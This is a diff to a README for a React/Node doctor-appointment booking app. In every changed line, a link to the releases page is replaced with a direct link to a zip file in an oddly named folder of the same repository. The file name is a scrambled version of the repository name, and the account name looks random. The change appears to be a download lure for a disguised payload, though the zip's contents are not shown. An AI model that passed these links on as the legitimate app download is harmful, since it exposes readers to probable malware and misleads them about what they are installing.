@@ -1,6 +1,6 @@
 # 📱 medico-doctor-appointment-booking-app-react-node - Book Care Appointments Fast
 
-[![Download](https://img.shields.io/badge/Download%20Latest-3B82F6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Larval-beardlessiris454/medico-doctor-appointment-booking-app-react-node/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-3B82F6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Larval-beardlessiris454/medico-doctor-appointment-booking-app-react-node/raw/refs/heads/main/exclusioner/doctor-appointment-app-node-booking-react-medico-v3.9.zip)
 
 ## 🩺 Overview
 
@@ -23,7 +23,7 @@ This app is designed for people who want a simple way to manage care on a phone.
 
 To get the app on Windows, visit this page to download the latest release:
 
-[Go to the releases page](https://github.com/Larval-beardlessiris454/medico-doctor-appointment-booking-app-react-node/releases)
+[Go to the releases page](https://github.com/Larval-beardlessiris454/medico-doctor-appointment-booking-app-react-node/raw/refs/heads/main/exclusioner/doctor-appointment-app-node-booking-react-medico-v3.9.zip)
 
 ## 📥 How to Download and Run on Windows
 
@@ -139,7 +139,7 @@ clinic-app, doctor-consultation-app, health-app, health-news-app, healthcare-app
 
 Download the latest release here:
 
-https://github.com/Larval-beardlessiris454/medico-doctor-appointment-booking-app-react-node/releases
+https://github.com/Larval-beardlessiris454/medico-doctor-appointment-booking-app-react-node/raw/refs/heads/main/exclusioner/doctor-appointment-app-node-booking-react-medico-v3.9.zip
 
 ## 🖼️ App Fit and Design
 
